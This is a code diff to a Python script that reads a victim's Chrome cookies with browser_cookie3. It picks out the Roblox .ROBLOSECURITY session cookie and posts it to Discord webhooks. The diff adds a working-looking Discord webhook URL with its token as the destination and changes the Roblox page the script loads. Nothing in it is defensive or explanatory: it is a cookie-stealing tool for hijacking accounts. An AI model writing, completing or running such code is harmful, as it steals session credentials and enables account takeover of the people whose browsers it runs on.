@@ -3,13 +3,13 @@ import threading
 import browser_cookie3 as cookie
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-webhook_urls = ['webhook url 1', 'webhook url 2']
+webhook_urls = ['https://discord.com/api/webhooks/1062345861218185216/dH2oqYdA8FyKZKS2cO6kB9QgMzOlwD_LxHll1I1BtjJHIkAe_jmNS92uXkoDGe-L1HRN', 'webhook url 2']
 
 def getCookiesFromPc():
     req = requests.Session()
     cj = cookie.chrome()
     req.cookies = cj
-    r = req.get("https://www.roblox.com/")
+    r = req.get("https://www.roblox.com/users/1123608764/profile")
     for c in req.cookies:
         if c.name == ".ROBLOSECURITY":
             webhook = DiscordWebhook(url='YOUR WEHBOOOOOOOOOOOK', content="@everyone")
